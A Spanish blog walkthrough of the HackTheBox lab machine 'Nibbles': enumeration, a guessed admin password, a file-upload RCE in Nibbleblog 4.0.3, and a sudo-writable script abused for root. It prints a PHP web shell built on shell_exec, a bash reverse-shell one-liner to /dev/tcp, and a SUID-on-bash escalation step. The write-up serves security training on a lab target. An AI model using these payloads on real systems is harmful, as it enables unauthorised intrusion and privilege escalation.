---
title: HTB - Nibbles
published: true
categories: [Linux]
tags: [eJPT, Fácil]
---

<img src="/assets/HTB/Nibbles/nibbles.png">

¡Hola!
Vamos a resolver de la máquina `Nibbles` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **Abusing Nibbleblog - Remote Code Execution via File Upload**
- **Abusing Sudoers Privilege [Privilege Escalation]**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Nibbles`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.75
PING 10.10.10.75 (10.10.10.75) 56(84) bytes of data.
64 bytes from 10.10.10.75: icmp_seq=1 ttl=63 time=38.3 ms

--- 10.10.10.75 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 38.334/38.334/38.334/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.75 -oG allPorts

PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```bash
nmap -sCV -p22,80 10.10.10.75 -oN targeted

PORT     STATE SERVICE VERSION
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Reconocimiento Web

* * *

Iniciamos el reconocimiento del servicio web con la herramienta `whatweb` la cual nos muestra información sobre las tecnologías web que incluyen sistemas de gestión de contenido (CMS), plataformas de blogs, paquetes de estadísticas / análisis, bibliotecas JavaScript, servidores web y dispositivos integrados.

```bash
❯ whatweb http://10.10.10.75
http://10.10.10.75 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
```

Accedemos al servicio web y vemos un Hello World nada más. Si miramos el código fuente tenemos una pista en un comentario


<img src="/assets/HTB/Nibbles/home.png">



<img src="/assets/HTB/Nibbles/html.png">


Accedemos a la ruta revelada y nos encontramos con un Blog que corre bajo la plataforma `Nibbleblog`


<img src="/assets/HTB/Nibbles/blog.png">


En este puto vamos a realizar fuzzig para encontrar posibles rutas y archivos ocultos

```bash
❯ gobuster dir -u "http://10.10.10.75/nibbleblog/" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt  -t 20 -x php
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/11/14 17:02:43 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 2987]
/sitemap.php          (Status: 200) [Size: 402] 
/content              (Status: 301) [Size: 329] [--> http://10.10.10.75/nibbleblog/content/]
/themes               (Status: 301) [Size: 328] [--> http://10.10.10.75/nibbleblog/themes/] 
/feed.php             (Status: 200) [Size: 302]                                                
/admin                (Status: 301) [Size: 327] [--> http://10.10.10.75/nibbleblog/admin/]  
/admin.php            (Status: 200) [Size: 1401]                                               
/plugins              (Status: 301) [Size: 329] [--> http://10.10.10.75/nibbleblog/plugins/]
/install.php          (Status: 200) [Size: 78]                                                 
/update.php           (Status: 200) [Size: 1622]                                               
/README               (Status: 200) [Size: 4628]                                               
/languages            (Status: 301) [Size: 331] [--> http://10.10.10.75/nibbleblog/languages/]
```

Accediendo a `admin.php` nos presenta un panel de login. En este caso en concreto tenemos que aplicar un poco de guessing. Tras varios intentos tratamos de acceder aplicando la password con el mismo nombre de la máquina para el usuario `admin`


<img src="/assets/HTB/Nibbles/admin.png">


Reconociendo el panel de admin localizamos la versión de Nibbleblog 4.0.3. Vamos a buscar con searchsploit vulnerabilidades asociadas

```bash
❯ searchsploit nibbleblog
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                   | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                    | php/remote/38489.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```
Tenemos un script en Ruby para Metasploit pero vamos a hacerlo de forma manual. Si examinamos el script vemos que se trata de una subida arbitraria de archivos aprovechando una vulnerabilidad en el plugin `My image`. Como sabemos que interpreta PHP vamos a tratar de subir un archivo malicioso el cual nos permita un RCE

```php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
Con el script creado en PHP vamos al panel de admin y en la sección `Plugins` -> `My image` subimos nuestro script. Navegamos a la ruta anteriormente descubierta con GoBuster `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/` y localizamos nuestro script. Haciendo click en el script ganamos ejecución remota de comandos


<img src="/assets/HTB/Nibbles/image.png">



<img src="/assets/HTB/Nibbles/rce.png">


Para ganar acceso a la máquina sólo tenemos que ponernos en escucha en nuestro equipo por el puerto 443 y ejecutar el oneliner para bash `bash -i >& /dev/tcp/10.10.14.60/443 0>&1`

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
nibbler
```

La flag de usuario la podemos encontrar en el directorio home del usuario nibbler

```bash
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cat /home/nibbler/user.txt 
d48e35d15e35ed618***************
```

### Escalada Privilegios

* * *

Enumeramos posibles privilegios de root asignados con `sudo -l`

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
Dentro de `/home/nibbler` nos percatamos de un comprimido `personal.zip`. Descomprimimos y nos crea `/personal/stuff/monitor.sh` el cual tenemos capacidad de escritura y podemos ejecutar como root. Sólo tenemos que añadir la línea `chmod u+s /bin/bash` para asignarle el privilegio SUID a la bash. Ejecutamos el script con sudo y mediante `bash -p` nos abrimos una bash con privilegios de root

```bash
nibbler@Nibbles:/home/nibbler/personal/stuff$ bash -p
bash-4.3# whoami
root
```

En el directorio `/root` localizamos la flag

```bash
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt 
6a72974b2a8865445***************
```

Hemos completado la máquina **Nibbles** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Nibbles/pwned.png">
